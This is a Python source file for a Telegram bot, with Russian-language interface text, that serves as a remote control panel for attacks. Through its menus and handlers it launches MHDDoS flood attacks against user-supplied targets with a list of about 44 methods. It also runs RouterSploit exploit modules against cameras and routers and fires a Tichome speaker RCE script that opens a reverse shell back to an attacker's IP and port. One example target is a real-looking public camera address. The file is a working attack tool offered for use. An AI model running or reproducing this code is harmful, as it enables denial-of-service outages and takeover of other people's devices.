#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# FSOCIETY ULTIMATE BOT – DDoS + IoT Exploits (Railway Edition)

import os
import sys
import subprocess
import threading
import time
import signal
import json
import shlex
import logging
from datetime import datetime
from pathlib import Path

from telegram import Update, ParseMode, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Updater, CommandHandler, CallbackQueryHandler,
    MessageHandler, Filters, CallbackContext
)

# ===== НАСТРОЙКИ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN не задан")
    sys.exit(1)

ADMIN_IDS_STR = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(",") if x.strip()]
if not ADMIN_IDS:
    print("❌ ADMIN_IDS не задан")
    sys.exit(1)

# Режим выполнения команд: "local" (запуск на том же сервере) или "ssh"
EXEC_MODE = os.getenv("EXEC_MODE", "local").lower()
SSH_HOST = os.getenv("SSH_HOST", "")
SSH_USER = os.getenv("SSH_USER", "")
SSH_KEY = os.getenv("SSH_KEY", "")

# Пути к инструментам (на целевой машине)
IOT_TOOLS_PATHS = {
    'routersploit': os.getenv("IOT_ROUTERSPLOIT", "/opt/routersploit/rsf.py"),
    'tichome': os.getenv("IOT_TICHOME", "/opt/tichome-poc/inject-reverse-shell-command.sh"),
    'smartcam': os.getenv("IOT_SMARTCAM", "/opt/smartcam_auditor/smartcam_auditor.py"),
    'iotscanner': os.getenv("IOT_SCANNER", "/opt/iot-scanner/iot-scanner"),
    'iothackbot': os.getenv("IOT_HACKBOT", "/opt/iothackbot"),
}

# ===== НАСТРОЙКА ЛОГИРОВАНИЯ =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== МЕТОДЫ АТАК (57 методов MHDDoS) =====
ATTACK_METHODS = [
    "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER",
    "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB",
    "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB",
    "TCP", "UDP", "SYN", "OVH-UDP", "CPS", "ICMP", "CONNECTION",
    "VSE", "TS3", "FIVEM", "FIVEM-TOKEN", "MEM", "NTP", "MCBOT",
    "MINECRAFT", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP"
]

# ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====
active_attacks = {}        # attack_id -> process info
attack_stats = {}           # attack_id -> информация о запуске

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
def is_allowed(update: Update):
    return update.effective_user.id in ADMIN_IDS

def build_ssh_cmd(remote_cmd):
    """Формирует команду для выполнения через SSH (если EXEC_MODE=ssh)"""
    if EXEC_MODE == "ssh" and SSH_HOST and SSH_USER:
        ssh_cmd = f"ssh -i {SSH_KEY} {SSH_USER}@{SSH_HOST} '{remote_cmd}'"
        return ssh_cmd
    return remote_cmd

def run_command(cmd, timeout=60, shell=True):
    """Запускает команду локально или через SSH и возвращает stdout/stderr"""
    full_cmd = build_ssh_cmd(cmd) if EXEC_MODE == "ssh" else cmd
    try:
        proc = subprocess.run(
            full_cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return proc.stdout, proc.stderr, proc.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -1

# ===== КЛАВИАТУРЫ =====
def main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 DDoS Атака", callback_data="attack"),
         InlineKeyboardButton("📊 Статус", callback_data="status")],
        [InlineKeyboardButton("🛑 Остановить всё", callback_data="stop_all"),
         InlineKeyboardButton("ℹ️ Методы", callback_data="methods")],
        [InlineKeyboardButton("🔧 IoT Exploits", callback_data="iot_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def attack_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data="cancel")]])

def methods_keyboard():
    keyboard = []
    row = []
    for i, method in enumerate(ATTACK_METHODS):
        row.append(InlineKeyboardButton(method, callback_data=f"method_{method}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("🔙 Главное меню", callback_data="main")])
    return InlineKeyboardMarkup(keyboard)

def iot_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("📡 RouterSploit", callback_data="iot_routersploit"),
         InlineKeyboardButton("📻 Tichome RCE", callback_data="iot_tichome")],
        [InlineKeyboardButton("🔍 SmartCam Auditor", callback_data="iot_smartcam"),
         InlineKeyboardButton("🌐 IoT Scanner", callback_data="iot_scanner")],
        [InlineKeyboardButton("🧰 IoTHackBot", callback_data="iot_hackbot"),
         InlineKeyboardButton("🔙 Главное меню", callback_data="main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def routersploit_module_keyboard():
    modules = [
        ("Hikvision Backdoor", "exploits/cameras/hikvision/hikvision_backdoor"),
        ("Dahua Auth Bypass", "exploits/cameras/dahua/dahua_auth_bypass"),
        ("D-Link RCE", "exploits/routers/dlink/dlink_dir_645_rce"),
        ("Realtek SDK RCE", "exploits/routers/realtek/realtek_sdk_rce"),
        ("Zyxel RCE", "exploits/routers/zyxel/zyxel_d1000_rce"),
    ]
    keyboard = []
    for name, mod in modules:
        keyboard.append([InlineKeyboardButton(name, callback_data=f"rsf_{mod}")])
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="iot_main")])
    return InlineKeyboardMarkup(keyboard)

# ===== ОБРАБОТЧИКИ КОМАНД =====
def start(update: Update, context: CallbackContext):
    if not is_allowed(update):
        update.message.reply_text("⛔ Доступ запрещён.")
        return
    update.message.reply_text(
        "🔥 **FSOCIETY ULTIMATE BOT** 🔥\n\n"
        "Выберите действие:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=main_keyboard()
    )

def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    data = query.data

    if not is_allowed(update):
        query.edit_message_text("⛔ Доступ запрещён.")
        return

    if data == "main":
        query.edit_message_text(
            "🔥 **Главное меню**",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_keyboard()
        )

    elif data == "methods":
        query.edit_message_text(
            "**📚 Список методов атаки (57):**\n\n" + ", ".join(ATTACK_METHODS),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=methods_keyboard()
        )

    elif data.startswith("method_"):
        method = data.split("_", 1)[1]
        context.user_data["selected_method"] = method
        query.edit_message_text(
            f"✅ Выбран метод: `{method}`\n\n"
            "Теперь отправьте цель в формате:\n"
            "`<target> <duration> [threads]`\n\n"
            "Пример: `https://example.com 60 5000`\n"
            "Для камеры: `185.28.154.238:554 60 5000`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=attack_keyboard()
        )

    elif data == "attack":
        query.edit_message_text(
            "⚡ Введите параметры атаки:\n"
            "`<target> <method> <duration> [threads]`\n\n"
            "Пример: `https://target.com GET 60 5000`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=attack_keyboard()
        )

    elif data == "status":
        if not active_attacks:
            query.edit_message_text("📊 Нет активных атак.", reply_markup=main_keyboard())
            return
        text = "**📊 Активные атаки:**\n"
        for aid, info in active_attacks.items():
            text += f"• `{aid}`: {info.get('target')} ({info.get('method')}) – PID {info.get('pid')}\n"
        query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_keyboard())

    elif data == "stop_all":
        # Останавливаем все локальные процессы (если они есть)
        for aid, info in active_attacks.items():
            if 'pid' in info:
                try:
                    os.kill(info['pid'], signal.SIGTERM)
                except:
                    pass
        active_attacks.clear()
        attack_stats.clear()
        query.edit_message_text("✅ Все атаки остановлены.", reply_markup=main_keyboard())

    elif data == "cancel":
        context.user_data.clear()
        query.edit_message_text("❌ Действие отменено.", reply_markup=main_keyboard())

    # ===== IoT МЕНЮ =====
    elif data == "iot_main":
        query.edit_message_text(
            "🔧 **IoT Exploits**\n\nВыберите инструмент:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=iot_main_keyboard()
        )

    elif data == "iot_routersploit":
        context.user_data['iot_tool'] = 'routersploit'
        query.edit_message_text(
            "🛠️ **RouterSploit**\nВыберите модуль:",
            reply_markup=routersploit_module_keyboard()
        )

    elif data.startswith("rsf_"):
        module = data.split("_", 1)[1]
        context.user_data['rsf_module'] = module
        query.edit_message_text(
            f"📌 Выбран модуль: `{module}`\n\nОтправьте IP цели:",
            parse_mode=ParseMode.MARKDOWN
        )

    elif data == "iot_tichome":
        context.user_data['iot_tool'] = 'tichome'
        query.edit_message_text(
            "📻 **Tichome Mini RCE (CVE-2026-26478)**\n\n"
            "Для получения reverse‑shell укажите IP колонки, ваш IP и порт через пробел.\n"
            "Пример: `192.168.1.100 192.168.1.50 4444`\n\n"
            "Отправьте сообщение в формате:\n"
            "`<target_ip> <your_ip> <port>`"
        )

    elif data == "iot_smartcam":
        context.user_data['iot_tool'] = 'smartcam'
        query.edit_message_text(
            "🔍 **SmartCam Auditor Pro**\n\n"
            "Укажите IP камеры (можно диапазон CIDR, например `192.168.1.0/24`):"
        )

    elif data == "iot_scanner":
        context.user_data['iot_tool'] = 'iotscanner'
        query.edit_message_text(
            "🌐 **IoT‑device‑Scanner**\n\n"
            "Укажите цель в формате:\n"
            "`scan --range <CIDR> [--full]`\n"
            "Пример: `scan --range 192.168.1.0/24 --full`"
        )

    elif data == "iot_hackbot":
        context.user_data['iot_tool'] = 'iothackbot'
        query.edit_message_text(
            "🧰 **IoTHackBot**\n\n"
            "Введите команду (например `wsdiscovery 192.168.1.0/24`):"
        )

def handle_message(update: Update, context: CallbackContext):
    if not is_allowed(update):
        return

    text = update.message.text.strip()

    # ----- Обработка DDoS -----
    if "selected_method" in context.user_data:
        method = context.user_data["selected_method"]
        parts = text.split()
        if len(parts) < 2:
            update.message.reply_text("❌ Неверный формат. Используйте: `<target> <duration> [threads]`")
            return
        target = parts[0]
        try:
            duration = int(parts[1])
        except ValueError:
            update.message.reply_text("❌ Длительность должна быть числом.")
            return
        threads = int(parts[2]) if len(parts) > 2 else 5000
        del context.user_data["selected_method"]
        run_attack(update, target, method, duration, threads)

    elif not context.user_data.get('iot_tool'):
        # Если не в режиме DDoS и не в IoT – проверяем формат с методом
        parts = text.split()
        if len(parts) >= 3:
            target = parts[0]
            method = parts[1].upper()
            if method in ATTACK_METHODS:
                try:
                    duration = int(parts[2])
                except ValueError:
                    update.message.reply_text("❌ Длительность должна быть числом.")
                    return
                threads = int(parts[3]) if len(parts) > 3 else 5000
                run_attack(update, target, method, duration, threads)
            else:
                update.message.reply_text("❌ Неизвестный метод. Список: /methods")
        else:
            update.message.reply_text("❌ Неверный формат. Используйте /attack или выберите в меню.")

    # ----- Обработка IoT -----
    if "iot_tool" in context.user_data:
        tool = context.user_data['iot_tool']
        if tool == 'routersploit' and 'rsf_module' in context.user_data:
            target = text.strip()
            module = context.user_data['rsf_module']
            del context.user_data['rsf_module']
            del context.user_data['iot_tool']
            run_routersploit(update, target, module)
        elif tool == 'tichome':
            parts = text.split()
            if len(parts) != 3:
                update.message.reply_text("❌ Нужно три параметра: <target_ip> <your_ip> <port>")
                return
            target_ip, your_ip, port = parts[0], parts[1], parts[2]
            del context.user_data['iot_tool']
            run_tichome(update, target_ip, your_ip, port)
        elif tool == 'smartcam':
            target = text.strip()
            del context.user_data['iot_tool']
            run_smartcam(update, target)
        elif tool == 'iotscanner':
            command = text.strip()
            del context.user_data['iot_tool']
            run_iotscanner(update, command)
        elif tool == 'iothackbot':
            command = text.strip()
            del context.user_data['iot_tool']
            run_iothackbot(update, command)

# ===== ФУНКЦИИ ЗАПУСКА АТАК =====
def run_attack(update, target, method, duration, threads):
    # Формируем команду MHDDoS (предполагаем, что MHDDoS установлен на целевой машине)
    # Вместо прямого запуска здесь можно отправить команду через SSH
    cmd = f"python3 /opt/MHDDoS/start.py {method} {target} {threads} {duration}"
    update.message.reply_text(f"🚀 Запуск атаки...\nКоманда: `{cmd}`", parse_mode=ParseMode.MARKDOWN)

    def run():
        out, err, rc = run_command(cmd)
        if rc == 0:
            update.message.reply_text(f"✅ Атака завершена.\n{out[:1000]}")
        else:
            update.message.reply_text(f"❌ Ошибка:\n{err}")

    threading.Thread(target=run, daemon=True).start()

def run_routersploit(update, target, module):
    cmd = f"python3 {IOT_TOOLS_PATHS['routersploit']} --module {module} --target {target}"
    update.message.reply_text(f"🛠️ Запуск RouterSploit...")
    out, err, rc = run_command(cmd, timeout=120)
    result = f"**RouterSploit result**\n```\n{out}\n```"
    if err:
        result += f"\n**Error:**\n```\n{err}\n```"
    update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)

def run_tichome(update, target_ip, your_ip, port):
    cmd = f"bash {IOT_TOOLS_PATHS['tichome']} {target_ip} {your_ip} {port}"
    update.message.reply_text("📡 Запуск Tichome RCE (ожидание reverse‑shell)...")
    out, err, rc = run_command(cmd, timeout=60)
    if rc == 0:
        update.message.reply_text(f"✅ Reverse‑shell получен!\n{out}")
    else:
        update.message.reply_text(f"❌ Ошибка:\n{err}")

def run_smartcam(update, target):
    cmd = f"python3 {IOT_TOOLS_PATHS['smartcam']} {target}"
    out, err, rc = run_command(cmd, timeout=120)
    result = f"**SmartCam Auditor**\n```\n{out}\n```"
    if err:
        result += f"\n**Error:**\n```\n{err}\n```"
    update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)

def run_iotscanner(update, command):
    # command вида "scan --range 192.168.1.0/24"
    cmd = f"{IOT_TOOLS_PATHS['iotscanner']} {command}"
    out, err, rc = run_command(cmd, timeout=120)
    result = f"**IoT Scanner**\n```\n{out}\n```"
    if err:
        result += f"\n**Error:**\n```\n{err}\n```"
    update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)

def run_iothackbot(update, command):
    cmd = f"cd {IOT_TOOLS_PATHS['iothackbot']} && {command}"
    out, err, rc = run_command(cmd, timeout=60)
    result = f"**IoTHackBot**\n```\n{out}\n```"
    if err:
        result += f"\n**Error:**\n```\n{err}\n```"
    update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)

# ===== КОМАНДА ДЛЯ ОСТАНОВКИ ПО ID =====
def stop_attack_by_id(update: Update, context: CallbackContext):
    if not is_allowed(update):
        update.message.reply_text("⛔ Доступ запрещён.")
        return
    args = context.args
    if len(args) != 1:
        update.message.reply_text("❌ Использование: /stop <attack_id>")
        return
    aid = args[0]
    if aid in active_attacks:
        pid = active_attacks[aid].get('pid')
        if pid:
            try:
                os.kill(pid, signal.SIGTERM)
            except:
                pass
        del active_attacks[aid]
        if aid in attack_stats:
            del attack_stats[aid]
        update.message.reply_text(f"✅ Атака {aid} остановлена.")
    else:
        update.message.reply_text("❌ Атака не найдена.")

# ===== ЗАПУСК БОТА =====
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop_attack_by_id))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    logger.info("🤖 Бот запущен...")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
